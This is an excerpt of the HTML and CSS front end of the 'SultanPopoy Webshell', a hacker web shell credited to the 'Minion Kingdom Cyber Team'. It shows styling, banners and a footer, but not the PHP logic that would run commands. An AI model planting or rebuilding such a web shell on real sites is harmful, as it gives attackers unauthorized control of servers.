...
<title>Banana Popoy??</title>
<style> @import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
.bg-dark { background-color: black; }
.border { border: 2px solid #f4ff00!important; border-radius: 0.75rem!important; background-color: transparent; color: white; padding-left: 1rem; }
.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #f4ff00; }
.table thead th { vertical-align: bottom; border: 2px solid #f4ff00; color: #ff1919; }
...
li{font-size:17px;margin-left:6px;list-style:none;color: #ff1919;list-style: inherit;}
a{ color: #ffffff; }
a:hover { text-decoration: none; color: #ff1919; }
button, input { border: 2px solid #ff1919;border-radius: 0.5rem;font-size: 1rem;color:white;line-height: normal; }
button, input:hover { border: 2px solid #f4ff00;border-radius: 0.5rem;font-size: 1rem;cursor: pointer; }
.ohct { padding-left: 1rem; padding-right: 1rem; color: white; border: 2px solid #ff1919; border-radius: 5px; background-color: black; }
.ohct:hover { border: 2px solid #f4ff00; color: white; }
.combet { color: white; }
.combet:hover { color: #ff1919; }
</style>
<style>
.fa {padding: 10px;font-size: 40px;width: 50px;text-align: center;text-decoration: none;margin: 5px;border-radius: 5px;border: 2px solid #f4ff00;background: transparent;}
.fa:hover {color: #ff1919;}
...
<center>
<img src="https://i.ibb.co/zbq50QH/seo-khualan.png" />
</center>
<div class="table-responsive text-light" style="border: 2px solid #f4ff00;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
<div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
<a href="https://superminion.guru/"><img src="https://i.ibb.co/5GVPRLk/ngakakpol.png" alt="ngakakpol" style="width: 40px; height: 40px; border: 0;"></a>
<a href="https://superminion.guru/"><img src="https://i.ibb.co/5GVPRLk/ngakakpol.png" alt="ngakakpol" style="width: 40px; height: 40px; border: 0;"></a>
<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px #f4ff00;"><span>SultanPopoy Webshell</span></a>
<a href="https://superminion.guru/"><img src="https://i.ibb.co/5GVPRLk/ngakakpol.png" alt="ngakakpol" style="width: 40px; height: 40px; border: 0;"></a>
<a href="https://superminion.guru/"><img src="https://i.ibb.co/5GVPRLk/ngakakpol.png" alt="ngakakpol" style="width: 40px; height: 40px; border: 0;"></a>
</div>
...
<div style="border: 2px solid #f4ff00;border-radius: 0.75rem;padding: 0.25rem;margin-top: 0.20rem;margin-bottom: 0.25rem;font-family: 'Kelly Slab';">
...
<h5 style="color: #ff1919;">
<font>&copy; Copyright 2024</font>
<font style="color: #f4ff00;">Mr.SultanPopoy</font>
<font>Powered by </font>
<font style="color: #f4ff00;">Minion Kingdom Cyber Team</font>
</h5>
<?php mR: ?> 
</article>
